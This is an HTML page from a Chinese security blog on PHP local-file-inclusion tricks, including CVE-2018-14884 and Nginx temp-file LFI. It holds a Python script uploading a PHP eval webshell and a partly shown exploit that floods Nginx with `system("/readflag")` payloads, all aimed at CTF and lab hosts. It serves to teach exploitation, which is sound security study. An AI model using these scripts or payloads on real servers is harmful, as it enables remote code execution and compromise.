@@ -1,0 +1,500 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="en">
+  <head>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>文件包含-LFI_Tricks - 东隅 Blog</title><meta name="author" content="东隅">
+<meta name="author-link" content="">
+<meta name="description" content="" /><meta name="keywords" content='OWASP, 文件包含' />
+  <meta itemprop="name" content="文件包含-LFI_Tricks">
+  <meta itemprop="datePublished" content="2024-08-15T09:31:01+08:00">
+  <meta itemprop="dateModified" content="2024-08-15T09:31:01+08:00">
+  <meta itemprop="wordCount" content="878">
+  <meta itemprop="keywords" content="OWASP,文件包含"><meta property="og:url" content="https://dongyu29.github.io/posts/owasp/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/113/">
+  <meta property="og:site_name" content="东隅 Blog">
+  <meta property="og:title" content="文件包含-LFI_Tricks">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-08-15T09:31:01+08:00">
+    <meta property="article:modified_time" content="2024-08-15T09:31:01+08:00">
+    <meta property="article:tag" content="OWASP">
+    <meta property="article:tag" content="文件包含">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="文件包含-LFI_Tricks">
+<meta name="application-name" content="FixIt">
+<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://dongyu29.github.io/posts/owasp/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/113/" /><link rel="prev" href="https://dongyu29.github.io/posts/owasp/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/112/" /><link rel="next" href="https://dongyu29.github.io/posts/owasp/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/114/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "文件包含-LFI_Tricks",
+    "inLanguage": "en",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https:\/\/dongyu29.github.io\/posts\/owasp\/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB\/113\/"
+    },"image": ["https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"],"genre": "posts","keywords": "OWASP, 文件包含","wordcount":  878 ,
+    "url": "https:\/\/dongyu29.github.io\/posts\/owasp\/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB\/113\/","datePublished": "2024-08-15T09:31:01+08:00","dateModified": "2024-08-15T09:31:01+08:00","publisher": {
+      "@type": "Organization",
+      "name": "","logo": "https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"},"author": {
+        "@type": "Person",
+        "name": "东隅"
+      },"description": ""
+  }
+  </script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('light' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'light' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="东隅 Blog"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅 Blog" data-title="东隅 Blog" width="26" height="26" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-pre"> </span><span class="typeit"><template> 东隅 Blog</template></span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/posts/"
+                
+                
+              ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/categories/"
+                
+                
+              ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/tags/"
+                
+                
+              ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/about/"
+                
+                
+              ><i class="fa-regular fa-id-card fa-fw fa-sm fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/about/"
+                
+                
+              ></a></li><li class="menu-item delimiter"></li><li class="menu-item theme-switch" title="Switch Theme">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="东隅 Blog"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅 Blog" data-title="东隅 Blog" width="26" height="26" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-pre"> </span><span class="typeit"><template> 东隅 Blog</template></span></a><span class="header-subtitle"></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/posts/"
+                  
+                  
+                ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/categories/"
+                  
+                  
+                ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/tags/"
+                  
+                  
+                ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/about/"
+                  
+                  
+                ><i class="fa-regular fa-id-card fa-fw fa-sm fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/about/"
+                  
+                  
+                ></a></li><li class="menu-item menu-system">
+          <span class="menu-system-item theme-switch" title="Switch Theme"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
+      </ul>
+    </nav>
+  </div>
+</header><nav aria-label="breadcrumb" class="breadcrumb-container sticky">
+    <ol class="breadcrumb"><li class="breadcrumb-item"><a href="/" title="东隅 Blog">Home</a></li><li class="breadcrumb-item"><a href="/posts/" title="Posts">Posts</a></li><li class="breadcrumb-item active" aria-current="page">文件包含-LFI_Tricks</li>
+    </ol>
+  </nav><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span title="Repost" class="icon-repost"><i class="fa-solid x" aria-hidden="true"></i></span><span>文件包含-LFI_Tricks</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅" data-title="东隅" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;东隅</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/owasp/" class="post-category" title="Category - OWASP"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> OWASP</a></span></div><div class="post-meta-line"><span title="published on 2024-08-15 09:31:01"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2024-08-15">2024-08-15</time></span>&nbsp;<span title="878 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 900 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>5 minutes</span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>Contents</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content" data-end-flag="-----（完）-----"><p>PHP-妙用/proc/self/fd触发LFI日志包含完成RCE命令执行</p>
+<h5 id="cve-2018-14884" class="heading-element"><span>0.0.0.1  CVE-2018-14884</span>
+  <a href="#cve-2018-14884" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><p>影响版本：An issue was discovered in PHP 7.0.x before 7.0.27, 7.1.x before 7.1.13, and 7.2.x before 7.2.1</p>
+<p>php代码中使用php://filter的strip_tags 过滤器, 可以让 php 执行的时候直接出现 Segment Fault , 这样 php 的垃圾回收机制就不会在继续执行 , 导致 POST 的文件会保存在系统的缓存目录下不会被清除而不像phpinfo那样上传的文件很快就会被删除，这样的情况下我们只需要知道其文件名就可以包含我们的恶意代码。</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">requests</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">url</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#34;http://483248ff-82c5-42bb-a11b-aae16c8857e8.challenge.ctf.show/?file=php://filter/string.strip_tags/resource=/etc/passwd&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">files</span><span style="color:#ff636f">=</span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#a6be9d">&#39;file&#39;</span>:(<span style="color:#a6be9d">&#39;&lt;?php eval($_REQUEST[kidult]);?&gt;&#39;</span>)
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">r</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">requests</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">post</span>(<span style="color:#58a1dd">url</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">url</span>,<span style="color:#58a1dd">files</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">files</span>)</span></span></code></pre></div><h5 id="临时文件" class="heading-element"><span>0.0.0.2  临时文件</span>
+  <a href="#%e4%b8%b4%e6%97%b6%e6%96%87%e4%bb%b6" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><blockquote>
+<p>大概的意思就是通过对<a href="https://github.com/php/php-src"target="_blank" rel="external nofollow noopener noreferrer">php-src</a>源代码的分析，发现可以使用<code>compress.zip://</code>流上传任意文件（<code>compress.zip://http</code>或者<code>compress.zip://ftp</code>，前提是开启<code>allow_url_include</code>），在此过程中会生成临时文件，然后再经过一系列操作之后绕过WAF并且保存临时文件，最终实现RCE</p>
+<p>最后看下来好像这个方法并没有特别的惊艳，特别是需要开启<code>allow_url_include</code>，而这个配置php默认是关闭的。</p>
+</blockquote>
+<p>用 <code>compress.zip://http://</code> 产生临时文件，包含即可，需要tmp这样的临时目录可写</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202305261656366.webp" alt="image-20230526165649630" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202305261656366.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202305261656366.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202305261656366.webp?size=large 2x" data-title="image-20230526165649630" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>临时文件终究还是会被 php 删除掉的，如果我们要进行包含的话，就需要利用一些方法让临时文件尽可能久的留存在服务器上，这样我们才有机会去包含它。</p>
+<p>所以这里是我们需要竞争的第一个点，基本上我们有两种方法让它停留比较久的时间：</p>
+<ul>
+<li>使用大文件传输，这样在传输的时候就会有一定的时间让我们包含到文件了。</li>
+<li>使用 FTP 速度控制，大文件传输根本上还是传输速度的问题，我们可以通过一些方式限制传输速率，比较简单的也可以利用<code>compress.zlib://ftp://</code>形式，控制 FTP 速度即可</li>
+</ul>
+<ol>
+<li>利用 <code>compress.zlib://http://</code>or<code>compress.zlib://ftp://</code> 来上传任意文件，并保持 HTTP 长链接竞争保存我们的临时文件</li>
+<li>利用超长的 name 溢出 output buffer 得到 sandbox 路径</li>
+<li>利用 Nginx 配置错误，通过 <code>.well-known../files/sandbox/</code>来获取我们 tmp 文件的文件名</li>
+<li>发送另一个请求包含我们的 tmp 文件，此时并没有 PHP 代码</li>
+<li>绕过 WAF 判断后，发送 PHP 代码段，包含我们的 PHP 代码拿到 Flag</li>
+</ol>
+<p>关键点主要是以下几点(来自 @wupco)：</p>
+<ol>
+<li>需要利用大文件或ftp速度限制让连接保持</li>
+<li>传入name过大 overflow output buffer，在保持连接的情况下获取沙箱路径</li>
+<li>tmp文件需要在两种文件直接疯狂切换，使得第一次<code>file_get_contents</code>获取的内容不带有<code>&lt;?</code>,<code>include</code>的时候是正常php代码，需要卡时间点，所以要多跑几次才行</li>
+<li><code>.well-known../files/</code>是nginx配置漏洞，就不多说了，用来列生成的tmp文件</li>
+</ol>
+<h5 id="nginx-tmp-file-lfi" class="heading-element"><span>0.0.0.3  Nginx Tmp File LFI</span>
+  <a href="#nginx-tmp-file-lfi" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><p><a href="https://tttang.com/archive/1384/"target="_blank" rel="external nofollow noopener noreferrer">https://tttang.com/archive/1384/</a></p>
+<blockquote>
+<p>原理：Nginx 接收Fastcgi的过大响应 或 request body过大时会缓存临时文件</p>
+</blockquote>
+<p>通过 POST 过大的 Body 正文让 Nginx 产生 Tmp 进而配合多重链接绕过 PHP 包含限制完成 RCE，但是利用点也相对局限，毕竟只验证了 Nginx ，可能换到其他服务器就不行了。</p>
+<ul>
+<li>Nginx 在后端 Fastcgi 响应过大 或 请求正文 body 过大时会产生临时文件</li>
+<li>通过多重链接绕过 PHP LFI stat 限制完成 LFI</li>
+</ul>
+<p>总结起来整个过程就是：</p>
+<ul>
+<li>让后端 php 请求一个过大的文件</li>
+<li>Fastcgi 返回响应包过大，导致 Nginx 需要产生临时文件进行缓存</li>
+<li>虽然 Nginx 删除了<code>/var/lib/nginx/fastcgi</code>下的临时文件，但是在 <code>/proc/pid/fd/</code> 下我们可以找到被删除的文件</li>
+<li>遍历 pid 以及 fd ，使用多重链接绕过 PHP 包含策略完成 LFI</li>
+</ul>
+<h5 id="nginx-request-body-temp-lfi" class="heading-element"><span>0.0.0.4  Nginx Request Body Temp LFI</span>
+  <a href="#nginx-request-body-temp-lfi" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><p>Nginx对于过大的请求体同样会将其内容存储在临时文件中。所以利用思路和Fastcgi的利用思路类似。</p>
+<p>exp</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">requests</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">threading</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">multiprocessing</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">threading</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">random</span>
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">SERVER</span> <span style="color:#ff636f">=</span> <span style="color:#a6be9d">&#34;http://192.168.43.103:49153&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">NGINX_PIDS_CACHE</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">set</span>([<span style="color:#a6be9d">34</span>, <span style="color:#a6be9d">35</span>, <span style="color:#a6be9d">36</span>, <span style="color:#a6be9d">37</span>, <span style="color:#a6be9d">38</span>, <span style="color:#a6be9d">39</span>, <span style="color:#a6be9d">40</span>, <span style="color:#a6be9d">41</span>])
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">##### Set the following to True to use the above set of PIDs instead of scanning:</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">USE_NGINX_PIDS_CACHE</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">False</span>
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#####创建会话句柄</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">def</span> <span style="color:#58a1dd">create_requests_session</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">session</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">requests</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">Session</span>()
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">##### Create a large HTTP connection pool to make HTTP requests as fast as possible without TCP handshake overhead</span>
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#####自定义HTTP适配器，创建连接池，消除tcp三次握手时延</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">adapter</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">requests</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">adapters</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">HTTPAdapter</span>(<span style="color:#58a1dd">pool_connections</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">1000</span>, <span style="color:#58a1dd">pool_maxsize</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">10000</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">session</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">mount</span>(<span style="color:#a6be9d">&#39;http://&#39;</span>, <span style="color:#58a1dd">adapter</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">return</span> <span style="color:#58a1dd">session</span>
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#####获取Nginx主进程pid</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">def</span> <span style="color:#58a1dd">get_nginx_pids</span>(<span style="color:#58a1dd">requests_session</span>):
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">if</span> <span style="color:#58a1dd">USE_NGINX_PIDS_CACHE</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">return</span> <span style="color:#58a1dd">NGINX_PIDS_CACHE</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">nginx_pids</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">set</span>()
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">##### Scan up to PID 200</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">for</span> <span style="color:#58a1dd">i</span> <span style="color:#ff636f">in</span> <span style="color:#58a1dd">range</span>(<span style="color:#a6be9d">1</span>, <span style="color:#a6be9d">200</span>):
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">cmdline</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">requests_session</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">get</span>(<span style="color:#58a1dd">SERVER</span> <span style="color:#ff636f">+</span> <span style="color:#a6be9d">f</span><span style="color:#a6be9d">&#34;/?action=read&amp;file=/proc/</span><span style="color:#a6be9d">{</span><span style="color:#58a1dd">i</span><span style="color:#a6be9d">}</span><span style="color:#a6be9d">/cmdline&#34;</span>)<span style="color:#ff636f">.</span><span style="color:#58a1dd">text</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">if</span> <span style="color:#58a1dd">cmdline</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">startswith</span>(<span style="color:#a6be9d">&#34;nginx: worker process&#34;</span>):
+</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">nginx_pids</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">add</span>(<span style="color:#58a1dd">i</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">return</span> <span style="color:#58a1dd">nginx_pids</span>
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#####向Nginx发送过大Body，使其生成临时文件</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">def</span> <span style="color:#58a1dd">send_payload</span>(<span style="color:#58a1dd">requests_session</span>, <span style="color:#58a1dd">body_size</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">1024000</span>):
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">try</span>:
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">##### The file path (/bla) doesn&#39;t need to exist - we simply need to upload a large body to Nginx and fail fast</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">payload</span> <span style="color:#ff636f">=</span> <span style="color:#a6be9d">&#39;&lt;?php system(&#34;/readflag&#34;);__halt_compiler(); ?&gt;&#39;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">requests_session</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">post</span>(<span style="color:#58a1dd">SERVER</span> <span style="color:#ff636f">+</span> <span style="color:#a6be9d">&#34;/?action=read&amp;file=/bla&#34;</span>, <span style="color:#58a1dd">data</span><span style="color:#ff636f">=</span>(<span style="color:#58a1dd">payload</span> <span style="color:#ff636f">+</span> (<span style="color:#a6be9d">&#34;a&#34;</span> <span style="color:#ff636f">*</span> (<span style="color:#58a1dd">body_size</span> <span style="color:#ff636f">-</span> <span style="color:#58a1dd">len</span>(<span style="color:#58a1dd">payload</span>)))))
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">except</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">pass</span>
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#####循环发送</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">def</span> <span style="color:#58a1dd">send_payload_worker</span>(<span style="color:#58a1dd">requests_session</span>):
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">while</span> <span style="color:#ff636f">True</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">send_payload</span>(<span style="color:#58a1dd">requests_session</span>)
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#####多线程发送Payload</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">def</span> <span style="color:#58a1dd">send_payload_multiprocess</span>(<span style="color:#58a1dd">requests_session</span>):
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">##### Use all CPUs to send the payload as request body for Nginx</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">for</span> <span style="color:#58a1dd">_</span> <span style="color:#ff636f">in</span> <span style="color:#58a1dd">range</span>(<span style="color:#58a1dd">multiprocessing</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">cpu_count</span>()):
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">p</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">multiprocessing</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">Process</span>(<span style="color:#58a1dd">target</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">send_payload_worker</span>, <span style="color:#58a1dd">args</span><span style="color:#ff636f">=</span>(<span style="color:#58a1dd">requests_session</span>,))
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">p</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">start</span>()
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#####生成随机路径/proc/pid/cwd/proc/pid/root绕过php软连接stat</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">def</span> <span style="color:#58a1dd">generate_random_path_prefix</span>(<span style="color:#58a1dd">nginx_pids</span>):
